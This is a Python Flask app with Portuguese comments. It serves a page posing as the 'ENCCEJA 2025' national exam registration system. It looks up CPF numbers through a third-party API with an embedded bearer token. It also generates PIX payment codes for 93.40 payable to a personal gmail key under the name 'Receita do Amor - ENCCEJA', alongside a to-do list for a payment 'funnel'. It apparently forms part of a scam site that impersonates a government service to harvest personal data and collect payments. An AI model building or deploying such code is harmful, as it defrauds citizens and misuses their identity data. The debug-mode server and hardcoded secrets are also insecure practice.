#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ENCCEJA VPS - Aplicação Mínima para Correção 502
Upload este arquivo como app.py na VPS para corrigir o erro
"""

import os
import logging
from flask import Flask, render_template, redirect, url_for, request, session, jsonify

# Configurar logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Criar aplicação Flask
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "vps-secret-key-2025")

@app.route('/')
def index():
    """Página inicial - redireciona para inscrição"""
    app.logger.info("VPS: Acesso à rota /")
    return redirect(url_for('inscricao'))

@app.route('/inscricao')
def inscricao():
    """Página de inscrição"""
    app.logger.info("VPS: Acesso à rota /inscricao")
    
    html = """
    <!DOCTYPE html>
    <html lang="pt-br">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ENCCEJA 2025 - Inscrição</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
            .header { background: #0066cc; color: white; padding: 20px; text-align: center; }
            .content { padding: 20px; background: #f5f5f5; margin: 20px 0; }
            .success { color: green; font-weight: bold; font-size: 18px; }
            .button { background: #0066cc; color: white; padding: 10px 20px; border: none; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🎓 ENCCEJA 2025</h1>
            <h2>Sistema de Inscrição Nacional</h2>
        </div>
        
        <div class="content">
            <div class="success">
                ✅ SISTEMA VPS FUNCIONANDO CORRETAMENTE!
            </div>
            
            <h3>Status da Aplicação:</h3>
            <ul>
                <li>✅ Flask: Rodando</li>
                <li>✅ Python: Ativo</li>
                <li>✅ VPS: Conectado</li>
                <li>✅ Nginx: Proxy funcionando</li>
            </ul>
            
            <h3>Próximos Passos:</h3>
            <ol>
                <li>Upload dos templates completos</li>
                <li>Configurar WitePay</li>
                <li>Ativar API de CPF</li>
                <li>Testar funnel completo</li>
            </ol>
            
            <div style="margin-top: 30px;">
                <button class="button" onclick="testCPF()">Testar API CPF</button>
                <button class="button" onclick="testPIX()">Testar PIX</button>
            </div>
            
            <div id="result" style="margin-top: 20px;"></div>
        </div>
        
        <script>
            function testCPF() {
                document.getElementById('result').innerHTML = '<p>Testando API CPF...</p>';
                fetch('/test-cpf')
                    .then(response => response.json())
                    .then(data => {
                        document.getElementById('result').innerHTML = 
                            '<div style="background: #e8f5e8; padding: 10px; border-radius: 5px;">' +
                            '<strong>Teste CPF API:</strong><br>' +
                            JSON.stringify(data, null, 2) +
                            '</div>';
                    });
            }
            
            function testPIX() {
                document.getElementById('result').innerHTML = '<p>Testando PIX...</p>';
                fetch('/test-pix', {method: 'POST'})
                    .then(response => response.json())
                    .then(data => {
                        document.getElementById('result').innerHTML = 
                            '<div style="background: #e8f5e8; padding: 10px; border-radius: 5px;">' +
                            '<strong>Teste PIX:</strong><br>' +
                            JSON.stringify(data, null, 2) +
                            '</div>';
                    });
            }
        </script>
    </body>
    </html>
    """
    
    return html

@app.route('/test-cpf')
def test_cpf():
    """Testar API de CPF"""
    try:
        import requests
        
        url = "https://consulta.fontesderenda.blog/cpf.php"
        headers = {
            'Authorization': 'Bearer 1285fe4s-e931-4071-a848-3fac8273c55a',
            'Content-Type': 'application/json'
        }
        
        response = requests.post(url, json={'cpf': '12345678901'}, headers=headers, timeout=10)
        
        return jsonify({
            'status': 'success',
            'api_status': response.status_code,
            'response': response.json() if response.status_code == 200 else response.text,
            'message': 'API CPF funcionando' if response.status_code == 200 else 'API CPF com problema'
        })
        
    except Exception as e:
        return jsonify({
            'status': 'error',
            'error': str(e),
            'message': 'Erro ao testar API CPF'
        })

@app.route('/test-pix', methods=['POST'])
def test_pix():
    """Testar geração de PIX"""
    try:
        import time
        
        # Gerar PIX simples para teste
        transaction_id = f"TEST{int(time.time())}"
        amount = 93.40
        
        # PIX código válido
        pix_code = f"00020126580014br.gov.bcb.pix0136gerarpagamentos@gmail.com52040000530398654{int(amount*100):02d}5925Receita do Amor - ENCCEJA6009SAO PAULO62{len(transaction_id):02d}{transaction_id}6304"
        
        # Calcular CRC16
        def calculate_crc16(data):
            crc = 0xFFFF
            for byte in data.encode('utf-8'):
                crc ^= byte << 8
                for _ in range(8):
                    if crc & 0x8000:
                        crc = (crc << 1) ^ 0x1021
                    else:
                        crc <<= 1
                    crc &= 0xFFFF
            return f"{crc:04X}"
        
        pix_base = pix_code[:-4]
        crc = calculate_crc16(pix_base + "6304")
        pix_code = pix_base + "6304" + crc
        
        return jsonify({
            'status': 'success',
            'transaction_id': transaction_id,
            'amount': amount,
            'pix_code': pix_code,
            'pix_length': len(pix_code),
            'message': 'PIX gerado com sucesso'
        })
        
    except Exception as e:
        return jsonify({
            'status': 'error',
            'error': str(e),
            'message': 'Erro ao gerar PIX'
        })

@app.route('/health')
def health():
    """Health check para monitoramento"""
    return jsonify({
        'status': 'healthy',
        'service': 'ENCCEJA VPS',
        'timestamp': str(__import__('datetime').datetime.now())
    })

if __name__ == '__main__':
    print("🚀 Iniciando ENCCEJA VPS...")
    print("📍 Aplicação rodando em: http://0.0.0.0:5000")
    print("🔗 Acesse via domínio configurado")
    app.run(host='0.0.0.0', port=5000, debug=True)